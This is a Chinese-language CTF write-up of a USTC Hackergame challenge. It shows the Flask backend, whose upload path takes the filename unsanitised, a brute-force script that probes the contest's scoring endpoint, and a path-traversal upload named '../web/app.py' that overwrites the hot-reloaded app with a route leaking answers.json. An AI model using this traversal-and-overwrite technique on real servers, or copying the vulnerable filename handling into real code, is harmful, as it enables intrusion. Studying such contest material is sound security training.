<h1 id="禁止内卷"><a href="#禁止内卷" class="headerlink" title="禁止内卷"></a>禁止内卷</h1><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, flash, redirect<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> traceback<br><span class="hljs-keyword">import</span> secrets<br><br>app = Flask(__name__)<br>app.secret_key = secrets.token_urlsafe(<span class="hljs-number">64</span>)<br><br>UPLOAD_DIR = <span class="hljs-string">&quot;/tmp/uploads&quot;</span><br><br>os.makedirs(UPLOAD_DIR, exist_ok=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># results is a list</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;results.json&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        results = json.load(f)<br>        <span class="hljs-comment"># 读取文件并解析为 JSON 格式</span><br><span class="hljs-keyword">except</span> FileNotFoundError:<br>    results = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;results.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        json.dump(results, f)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_answer</span>():<br>    <span class="hljs-comment"># scoring with answer</span><br>    <span class="hljs-comment"># I could change answers anytime so let&#x27;s just load it every time</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;answers.json&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        answers = json.load(f)<br>        <span class="hljs-comment"># sanitize answer</span><br>        <span class="hljs-keyword">for</span> idx, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(answers):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span>:<br>                answers[idx] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> answers<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, results=<span class="hljs-built_in">sorted</span>(results))<br>    <span class="hljs-comment"># 注意这个排序</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/submit&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files <span class="hljs-keyword">or</span> request.files[<span class="hljs-string">&#x27;file&#x27;</span>].filename == <span class="hljs-string">&quot;&quot;</span>:<br>        flash(<span class="hljs-string">&quot;你忘了上传文件&quot;</span>)<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    filename = file.filename<br>    filepath = os.path.join(UPLOAD_DIR, filename)<br>    file.save(filepath)<br><br>    answers = get_answer()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath) <span class="hljs-keyword">as</span> f:<br>            user = json.load(f)<br>    <span class="hljs-keyword">except</span> json.decoder.JSONDecodeError:<br>        flash(<span class="hljs-string">&quot;你提交的好像不是 JSON&quot;</span>)<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        score = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> idx, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(answers):<br>            score += (i - user[idx]) * (i - user[idx])<br>            <span class="hljs-comment"># 平方差的总和</span><br>    <span class="hljs-keyword">except</span>:<br>        flash(<span class="hljs-string">&quot;分数计算出现错误&quot;</span>)<br>        traceback.print_exc()<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-comment"># ok, update results</span><br>    results.append(score)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;results.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        json.dump(results, f)<br>    flash(<span class="hljs-string">f&quot;评测成功，你的平方差为 <span class="hljs-subst">&#123;score&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>仔细阅读后端代码，后端接收到上传的文件后，首先会检查文件是否存在，然后将文件保存到 <code>/tmp/uploads</code> 目录。后端会尝试将上传的文件读取并解析为 JSON 格式。然后，它将与预设的 <code>answers.json</code> 进行比较。通过计算上传的文件中的数字与 <code>answers.json</code> 中的数字之间的平方差得到评分。</p>
<p>如果提交的 JSON 列表每一项都是 0，那么评分的结果将等于 <code>answers</code> 列表所有元素的平方和。通过更改第一个元素猜测<code>answers</code> 列表的第一个元素：如果是37，那么两次结果的差应是37的平方。</p>
<blockquote>
<p>[!NOTE]<br>JSON（JavaScript Object Notation）是一种轻量级的数据交换格式。它通常用于传输数据，特别是在 Web 应用程序中。JSON 格式的数据结构由以下几部分组成：</p>
<ul>
<li>对象（Object）：由花括号 <code>&#123;&#125;</code> 包裹的键值对集合，键必须是字符串，值可以是多种类型。</li>
<li>数组（Array）：由方括号 <code>[]</code> 包裹的值的集合，值可以是任何类型。</li>
<li>字符串（String）：被双引号 <code>&quot;</code> 包裹的文本。</li>
<li>数字（Number）、布尔值（Boolean）、null：JSON 也支持这些原始数据类型。<br>在 JSON 格式中，数据本质上是以<strong>字符串</strong>的形式传输的。</li>
</ul>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241108140943.png"></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">data</span>):<br>    url = <span class="hljs-string">&#x27;https://chal02-vfyz4byt.hack-challenge.lug.ustc.edu.cn:8443/submit&#x27;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;user-agent&#x27;</span> : <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0&#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># 后端：file = request.files[&#x27;file&#x27;]</span><br>    files = &#123;<br>        <span class="hljs-string">&#x27;file&#x27;</span> : (<span class="hljs-string">&#x27;test&#x27;</span>, data, <span class="hljs-string">&#x27;application/json&#x27;</span>)<br>    &#125;<br>    response = requests.post(url, headers=headers, files=files)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        <span class="hljs-built_in">list</span> = soup.find_all(<span class="hljs-string">&#x27;li&#x27;</span>, class_ = <span class="hljs-string">&#x27;list-group-item&#x27;</span>) <span class="hljs-comment"># class_ 是 class 的替代写法，因为 class 是 Python 的保留字。</span><br>        <span class="hljs-comment"># find_all() 方法返回一个包含所有匹配结果的列表</span><br>        scores=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>            score = i.get_text().split(<span class="hljs-string">&#x27;：&#x27;</span>)[<span class="hljs-number">1</span>].strip()<br>            <span class="hljs-comment"># 提取出 ：后面的数字部分，并去除任何多余的空格或换行符</span><br>            scores.append(score)<br>        <span class="hljs-keyword">return</span> scores<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Request failed with status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_new_score</span>(<span class="hljs-params">a1, a2</span>):<br>    count1 = Counter(a1)<br>    count2 = Counter(a2)<br>    <span class="hljs-comment"># 找到在arr2中多出来的元素</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> count2:<br>        <span class="hljs-keyword">if</span> count2[num] != count1.get(num,<span class="hljs-number">0</span>):<br>            <span class="hljs-comment"># 如果 num 元素在 count2 中的出现次数与在 count1 中的出现次数不相等,则返回num</span><br>            <span class="hljs-comment"># 如果 num 不在 count1 中，则返回 0</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(num) <span class="hljs-comment"># score是字符串</span><br>            <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scores1 = send(<span class="hljs-built_in">str</span>([<span class="hljs-number">0</span>]*<span class="hljs-number">500</span>))<br>    scores2 = send(<span class="hljs-built_in">str</span>([<span class="hljs-number">0</span>]*<span class="hljs-number">500</span>))<br>    all_zero_score = find_new_score(scores1, scores2)<br>    <span class="hljs-comment"># 找到全0的平方差</span><br>    <span class="hljs-built_in">print</span>(scores1)<br>    <span class="hljs-built_in">print</span>(scores2)<br>    <span class="hljs-built_in">print</span>(all_zero_score)<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    payload = [<span class="hljs-number">0</span>]*<span class="hljs-number">500</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>            payload[j] = i<br>            scores1 = send(<span class="hljs-built_in">str</span>(payload))<br>            score = find_new_score (scores1, scores2)<br>            <span class="hljs-keyword">if</span> score == all_zero_score - i*i:<br>                flag += <span class="hljs-built_in">chr</span>(i+<span class="hljs-number">65</span>)<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<p>但是flag提交上去显示答案错误。因为在 flask 代码中做了「归一化」的操作：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> idx, <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(answers):<br>    <span class="hljs-keyword">if</span> <span class="hljs-selector-tag">i</span> &lt; <span class="hljs-number">0</span>:<br>        answers<span class="hljs-selector-attr">[idx]</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>重新审题。题目中有提示：助教部署的时候偷懒了，直接用了 <code>flask run</code>（当然了，助教也读过 Flask 的文档，所以 DEBUG 是关了的）。而且有的时候助教想改改代码，又懒得手动重启，所以还开了 <code>--reload</code>。启动的<strong>完整命令</strong>为 <code>flask run --reload --host 0</code>。网站代码运行在 <code>/tmp/web</code>。</p>
<p>在使用 Flask 时，<code>app.py</code> 通常是 Flask 应用的主文件。这道题的关键是服务器的后端使用了<code>flask run --reload --host 0</code>命令运行，并开启了<code>--reload</code>选项，那么如果有文件换掉了<code>app.py</code>，flask会马上应用新的脚本。所以在源代码中写一个读取并返回<code>answer.json</code>的route，然后上传替换掉原本的 <code>app.py</code> 即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(): <br>	<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;answers.json&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>		answers = json.load(f)<br>		<span class="hljs-keyword">return</span> answers<br></code></pre></td></tr></table></figure>

<p>上传文件的目录是 <code>/tmp/uploads</code> ，题干又特意提示了网站目录在 <code>/tmp/web</code>，想到路径穿越漏洞。上传文件的时候，给文件名前加上<code>../</code>就可以穿透目录，上传到任意的地方去。BurpSuite抓包，修改传输路径为<code>../web/app.py</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241111134142.png"></p>
<p>访问&#x2F;flag：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241111134241.png"></p>
<p>对应的数字加 65 后使用 ASCII 编码转换：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">a</span>=[<span class="hljs-number">37</span>,<span class="hljs-number">43</span>,<span class="hljs-number">32</span>,<span class="hljs-number">38</span>,<span class="hljs-number">58</span>,<span class="hljs-number">52</span>,<span class="hljs-number">45</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,-<span class="hljs-number">32</span>,<span class="hljs-number">30</span>,<span class="hljs-number">36</span>,<span class="hljs-number">50</span>,<span class="hljs-number">49</span>,<span class="hljs-number">36</span>,<span class="hljs-number">53</span>,<span class="hljs-number">36</span>,<span class="hljs-number">49</span>,<span class="hljs-number">30</span>,<span class="hljs-number">45</span>,<span class="hljs-number">46</span>,<span class="hljs-number">54</span>,<span class="hljs-number">30</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">49</span>,<span class="hljs-number">52</span>,<span class="hljs-number">45</span>,<span class="hljs-number">30</span>,<span class="hljs-number">12</span>,<span class="hljs-number">24</span>,<span class="hljs-number">30</span>,<span class="hljs-number">34</span>,-<span class="hljs-number">17</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,-<span class="hljs-number">17</span>,-<span class="hljs-number">16</span>,-<span class="hljs-number">14</span>,<span class="hljs-number">32</span>,-<span class="hljs-number">10</span>,<span class="hljs-number">33</span>,-<span class="hljs-number">8</span>,<span class="hljs-number">36</span>,-<span class="hljs-number">17</span>,<span class="hljs-number">60</span>,<span class="hljs-number">56</span>,<span class="hljs-number">38</span>,<span class="hljs-number">37</span>,<span class="hljs-number">79</span>,<span class="hljs-number">59</span>,<span class="hljs-number">9</span>,<span class="hljs-number">33</span>,<span class="hljs-number">88</span>,<span class="hljs-number">72</span>,<span class="hljs-number">58</span>,<span class="hljs-number">80</span>,<span class="hljs-number">17</span>,<span class="hljs-number">3</span>,<span class="hljs-number">81</span>,<span class="hljs-number">17</span>,<span class="hljs-number">87</span>,<span class="hljs-number">89</span>,<span class="hljs-number">34</span>,<span class="hljs-number">74</span>,<span class="hljs-number">92</span>,<span class="hljs-number">25</span>,<span class="hljs-number">76</span>,<span class="hljs-number">38</span>,<span class="hljs-number">98</span>,<span class="hljs-number">15</span>,<span class="hljs-number">18</span>,<span class="hljs-number">45</span>,<span class="hljs-number">41</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">4</span>,<span class="hljs-number">17</span>,<span class="hljs-number">94</span>,<span class="hljs-number">9</span>,<span class="hljs-number">99</span>,<span class="hljs-number">87</span>,<span class="hljs-number">65</span>,<span class="hljs-number">35</span>,<span class="hljs-number">73</span>,<span class="hljs-number">63</span>,<span class="hljs-number">50</span>,<span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">95</span>,<span class="hljs-number">27</span>,<span class="hljs-number">35</span>,<span class="hljs-number">9</span>,<span class="hljs-number">27</span>,<span class="hljs-number">13</span>,<span class="hljs-number">62</span>,<span class="hljs-number">32</span>,<span class="hljs-number">84</span>,<span class="hljs-number">34</span>,<span class="hljs-number">76</span>,<span class="hljs-number">43</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">78</span>,<span class="hljs-number">33</span>,<span class="hljs-number">1</span>,<span class="hljs-number">24</span>,<span class="hljs-number">83</span>,<span class="hljs-number">58</span>,<span class="hljs-number">98</span>,<span class="hljs-number">62</span>,<span class="hljs-number">6</span>,<span class="hljs-number">88</span>,<span class="hljs-number">76</span>,<span class="hljs-number">32</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">54</span>,<span class="hljs-number">35</span>,<span class="hljs-number">69</span>,<span class="hljs-number">62</span>,<span class="hljs-number">74</span>,<span class="hljs-number">71</span>,<span class="hljs-number">20</span>,<span class="hljs-number">71</span>,<span class="hljs-number">67</span>,<span class="hljs-number">53</span>,<span class="hljs-number">30</span>,<span class="hljs-number">49</span>,<span class="hljs-number">99</span>,<span class="hljs-number">94</span>,<span class="hljs-number">69</span>,<span class="hljs-number">7</span>,<span class="hljs-number">47</span>,<span class="hljs-number">97</span>,<span class="hljs-number">94</span>,<span class="hljs-number">96</span>,<span class="hljs-number">67</span>,<span class="hljs-number">43</span>,<span class="hljs-number">40</span>,<span class="hljs-number">66</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">88</span>,<span class="hljs-number">67</span>,<span class="hljs-number">10</span>,<span class="hljs-number">73</span>,<span class="hljs-number">20</span>,<span class="hljs-number">91</span>,<span class="hljs-number">10</span>,<span class="hljs-number">90</span>,<span class="hljs-number">99</span>,<span class="hljs-number">87</span>,<span class="hljs-number">65</span>,<span class="hljs-number">32</span>,<span class="hljs-number">81</span>,<span class="hljs-number">3</span>,<span class="hljs-number">80</span>,<span class="hljs-number">41</span>,<span class="hljs-number">67</span>,<span class="hljs-number">40</span>,<span class="hljs-number">19</span>,<span class="hljs-number">19</span>,<span class="hljs-number">14</span>,<span class="hljs-number">97</span>,<span class="hljs-number">97</span>,<span class="hljs-number">19</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">76</span>,<span class="hljs-number">24</span>,<span class="hljs-number">57</span>,<span class="hljs-number">47</span>,<span class="hljs-number">77</span>,<span class="hljs-number">28</span>,<span class="hljs-number">28</span>,<span class="hljs-number">79</span>,<span class="hljs-number">1</span>,<span class="hljs-number">48</span>,<span class="hljs-number">55</span>,<span class="hljs-number">0</span>,<span class="hljs-number">20</span>,<span class="hljs-number">72</span>,<span class="hljs-number">49</span>,<span class="hljs-number">84</span>,<span class="hljs-number">4</span>,<span class="hljs-number">83</span>,<span class="hljs-number">4</span>,<span class="hljs-number">70</span>,<span class="hljs-number">16</span>,<span class="hljs-number">55</span>,<span class="hljs-number">37</span>,<span class="hljs-number">77</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">43</span>,<span class="hljs-number">20</span>,<span class="hljs-number">46</span>,<span class="hljs-number">81</span>,<span class="hljs-number">12</span>,<span class="hljs-number">81</span>,<span class="hljs-number">59</span>,<span class="hljs-number">14</span>,<span class="hljs-number">23</span>,<span class="hljs-number">32</span>,<span class="hljs-number">77</span>,<span class="hljs-number">76</span>,<span class="hljs-number">81</span>,<span class="hljs-number">88</span>,<span class="hljs-number">44</span>,<span class="hljs-number">44</span>,<span class="hljs-number">11</span>,<span class="hljs-number">76</span>,<span class="hljs-number">92</span>,<span class="hljs-number">4</span>,<span class="hljs-number">21</span>,<span class="hljs-number">21</span>,<span class="hljs-number">92</span>,<span class="hljs-number">31</span>,<span class="hljs-number">89</span>,<span class="hljs-number">100</span>,<span class="hljs-number">78</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">22</span>,<span class="hljs-number">84</span>,<span class="hljs-number">60</span>,<span class="hljs-number">28</span>,<span class="hljs-number">22</span>,<span class="hljs-number">66</span>,<span class="hljs-number">32</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">87</span>,<span class="hljs-number">16</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">69</span>,<span class="hljs-number">29</span>,<span class="hljs-number">77</span>,<span class="hljs-number">58</span>,<span class="hljs-number">77</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">65</span>,<span class="hljs-number">36</span>,<span class="hljs-number">95</span>,<span class="hljs-number">71</span>,<span class="hljs-number">68</span>,<span class="hljs-number">57</span>,<span class="hljs-number">44</span>,<span class="hljs-number">56</span>,<span class="hljs-number">65</span>,<span class="hljs-number">69</span>,<span class="hljs-number">73</span>,<span class="hljs-number">83</span>,<span class="hljs-number">55</span>,<span class="hljs-number">8</span>,<span class="hljs-number">93</span>,<span class="hljs-number">18</span>,<span class="hljs-number">38</span>,<span class="hljs-number">98</span>,<span class="hljs-number">5</span>,<span class="hljs-number">24</span>,<span class="hljs-number">33</span>,<span class="hljs-number">52</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">66</span>,<span class="hljs-number">58</span>,<span class="hljs-number">61</span>,<span class="hljs-number">83</span>,<span class="hljs-number">78</span>,<span class="hljs-number">36</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">41</span>,<span class="hljs-number">48</span>,<span class="hljs-number">71</span>,<span class="hljs-number">56</span>,<span class="hljs-number">83</span>,<span class="hljs-number">40</span>,<span class="hljs-number">90</span>,<span class="hljs-number">47</span>,<span class="hljs-number">67</span>,<span class="hljs-number">75</span>,<span class="hljs-number">13</span>,<span class="hljs-number">46</span>,<span class="hljs-number">13</span>,<span class="hljs-number">39</span>,<span class="hljs-number">60</span>,<span class="hljs-number">92</span>,<span class="hljs-number">58</span>,<span class="hljs-number">91</span>,<span class="hljs-number">42</span>,<span class="hljs-number">66</span>,<span class="hljs-number">54</span>,<span class="hljs-number">76</span>,<span class="hljs-number">100</span>,<span class="hljs-number">24</span>,<span class="hljs-number">66</span>,<span class="hljs-number">48</span>,<span class="hljs-number">35</span>,<span class="hljs-number">31</span>,<span class="hljs-number">5</span>,<span class="hljs-number">56</span>,<span class="hljs-number">80</span>,<span class="hljs-number">58</span>,<span class="hljs-number">91</span>,<span class="hljs-number">21</span>,<span class="hljs-number">9</span>,<span class="hljs-number">25</span>,<span class="hljs-number">5</span>,<span class="hljs-number">25</span>,<span class="hljs-number">10</span>,<span class="hljs-number">55</span>,<span class="hljs-number">5</span>,<span class="hljs-number">47</span>,<span class="hljs-number">30</span>,<span class="hljs-number">77</span>,<span class="hljs-number">86</span>,<span class="hljs-number">91</span>,<span class="hljs-number">5</span>,<span class="hljs-number">51</span>,<span class="hljs-number">37</span>,<span class="hljs-number">54</span>,<span class="hljs-number">47</span>,<span class="hljs-number">91</span>,<span class="hljs-number">34</span>,<span class="hljs-number">11</span>,<span class="hljs-number">56</span>,<span class="hljs-number">34</span>,<span class="hljs-number">93</span>,<span class="hljs-number">94</span>,<span class="hljs-number">64</span>,<span class="hljs-number">14</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">88</span>,<span class="hljs-number">53</span>,<span class="hljs-number">12</span>,<span class="hljs-number">69</span>,<span class="hljs-number">89</span>,<span class="hljs-number">31</span>,<span class="hljs-number">66</span>,<span class="hljs-number">6</span>,<span class="hljs-number">33</span>,<span class="hljs-number">2</span>,<span class="hljs-number">36</span>,<span class="hljs-number">32</span>,<span class="hljs-number">30</span>,<span class="hljs-number">82</span>,<span class="hljs-number">27</span>,<span class="hljs-number">35</span>,<span class="hljs-number">91</span>,<span class="hljs-number">31</span>,<span class="hljs-number">55</span>,<span class="hljs-number">92</span>,<span class="hljs-number">67</span>,<span class="hljs-number">25</span>,<span class="hljs-number">71</span>,<span class="hljs-number">68</span>,<span class="hljs-number">26</span>,<span class="hljs-number">31</span>,<span class="hljs-number">89</span>,<span class="hljs-number">27</span>,<span class="hljs-number">60</span>,<span class="hljs-number">72</span>,<span class="hljs-number">1</span>,<span class="hljs-number">82</span>,<span class="hljs-number">68</span>,<span class="hljs-number">32</span>,<span class="hljs-number">7</span>,<span class="hljs-number">65</span>,<span class="hljs-number">14</span>,<span class="hljs-number">19</span>,<span class="hljs-number">59</span>,<span class="hljs-number">34</span>,<span class="hljs-number">85</span>,<span class="hljs-number">99</span>,<span class="hljs-number">21</span>,<span class="hljs-number">82</span>,<span class="hljs-number">27</span>,<span class="hljs-number">86</span>,<span class="hljs-number">31</span>,<span class="hljs-number">19</span>,<span class="hljs-number">10</span>,<span class="hljs-number">21</span>,<span class="hljs-number">53</span>,<span class="hljs-number">77</span>,<span class="hljs-number">38</span>,<span class="hljs-number">43</span>,<span class="hljs-number">48</span>,<span class="hljs-number">55</span>,<span class="hljs-number">41</span>,<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">67</span>,<span class="hljs-number">1</span>,<span class="hljs-number">40</span>,<span class="hljs-number">74</span>,<span class="hljs-number">16</span>,<span class="hljs-number">34</span>,<span class="hljs-number">25</span>,<span class="hljs-number">25</span>,<span class="hljs-number">34</span>,<span class="hljs-number">53</span>,<span class="hljs-number">1</span>,<span class="hljs-number">43</span>,<span class="hljs-number">61</span>,<span class="hljs-number">22</span>,<span class="hljs-number">81</span>,<span class="hljs-number">50</span>,<span class="hljs-number">28</span>,<span class="hljs-number">72</span>,<span class="hljs-number">5</span>,<span class="hljs-number">19</span>,<span class="hljs-number">80</span>,<span class="hljs-number">81</span>,<span class="hljs-number">69</span>,<span class="hljs-number">87</span>,<span class="hljs-number">25</span>,<span class="hljs-number">42</span>,<span class="hljs-number">97</span>,<span class="hljs-number">15</span>,<span class="hljs-number">52</span>,<span class="hljs-number">80</span>,<span class="hljs-number">93</span>,<span class="hljs-number">16</span>,<span class="hljs-number">34</span>,<span class="hljs-number">1</span>,<span class="hljs-number">37</span>,<span class="hljs-number">2</span>,<span class="hljs-number">62</span>,<span class="hljs-number">59</span>,<span class="hljs-number">13</span>,<span class="hljs-number">53</span>,<span class="hljs-number">93</span>,<span class="hljs-number">87</span>,<span class="hljs-number">78</span>,<span class="hljs-number">30</span>,<span class="hljs-number">50</span>,<span class="hljs-number">46</span>,<span class="hljs-number">79</span>,<span class="hljs-number">50</span>,<span class="hljs-number">40</span>,<span class="hljs-number">70</span>,<span class="hljs-number">29</span>,<span class="hljs-number">29</span>,<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,<span class="hljs-number">47</span>,<span class="hljs-number">81</span>,<span class="hljs-number">29</span>,<span class="hljs-number">71</span>,<span class="hljs-number">55</span>,<span class="hljs-number">46</span>,<span class="hljs-number">83</span>,<span class="hljs-number">79</span>,<span class="hljs-number">99</span>,<span class="hljs-number">3</span>,<span class="hljs-number">32</span>,<span class="hljs-number">85</span>,<span class="hljs-number">35</span>,<span class="hljs-number">0</span>,<span class="hljs-number">40</span>,<span class="hljs-number">79</span>,<span class="hljs-number">77</span>,<span class="hljs-number">85</span>,<span class="hljs-number">77</span>,<span class="hljs-number">9</span>,<span class="hljs-number">96</span>,<span class="hljs-number">74</span>,<span class="hljs-number">7</span>,<span class="hljs-number">78</span>,<span class="hljs-number">28</span>,<span class="hljs-number">11</span>,<span class="hljs-number">83</span>,<span class="hljs-number">3</span>,<span class="hljs-number">24</span>,<span class="hljs-number">46</span>,<span class="hljs-number">94</span>,<span class="hljs-number">45</span>,<span class="hljs-number">11</span>,<span class="hljs-number">20</span>,<span class="hljs-number">95</span>,<span class="hljs-number">10</span>,<span class="hljs-number">75</span>,<span class="hljs-number">66</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">69</span>,<span class="hljs-number">32</span>,<span class="hljs-number">55</span>,<span class="hljs-number">29</span>,<span class="hljs-number">88</span>]<br><br><span class="hljs-attribute">for</span> num in a:<br>    <span class="hljs-attribute">char</span> = chr(num + <span class="hljs-number">65</span>)<br>    <span class="hljs-attribute">flag</span> += char<br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241111141350.png"></p>
